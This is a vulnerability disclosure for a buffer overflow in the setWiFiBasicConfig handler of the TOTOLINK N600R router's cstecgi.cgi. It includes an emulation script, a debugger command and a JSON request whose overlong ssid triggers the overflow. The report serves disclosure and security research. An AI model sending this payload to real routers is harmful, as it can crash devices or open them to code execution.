# Bug Report: Buffer Overflow in TOTOLINK N600R Router
A buffer overflow vulnerability has been identified in the TOTOLINK N600R router firmware that allows remote attackers to potentially execute arbitrary code or cause denial of service through malformed HTTP requests.

## Vulnerability Details

### Product Information
- **Product**: TOTOLINK N600R Wireless Router
- **Affected Version**: V4.3.0cu.7866_B20220506
- **Download Source**: https://totolink.tw/support_view/N600R
- **Vulnerability Type**: Buffer Overflow

## Description:
The vulnerable code is within the setWiFiBasicConfig function in cstecgi.cgi. It extracts the `ssid` parameter into `v10` and passes it into the `strncpy` function while the string copy size is also derived from the `ssid` parameter by `v23 = strlen(v10)`. When `ssid` is specified with excessive data (>36), a buffer overflow occurs.

![alt text](image-2.png)

![alt text](image-3.png)

![alt text](image-4.png)

## poc
We set a breakpoint before the strcpy call and examined the memory state both before and after the out-of-bounds write. The memory dump clearly demonstrates that a buffer overflow occurred.
![alt text](image.png)
![alt text](image-1.png)

## reproduce

```bash
./sub_41E0C0.sh
```
```bash
gdb-multiarch ./web_cste/cgi-bin/cstecgi_41E0C0.cgi
```

### sub_41E0C0.sh
```bash
chroot ./ ./qemu-mips-static\
        -E  CONTENT_LENGTH="990"  -g  123  -L  ./lib  \
        ./web_cste/cgi-bin/cstecgi_41E0C0.cgi  < sub_41E0C0.json
```
### sub_41E0C0.json
```json
{
        "topicurl" : "UploadCustomModule/setWiFiBasicConfig",
        "ssid" : "1111111111111111111111111111111111111111111111111111111111111llllllllllllllllllllabcdDOIT"
}
```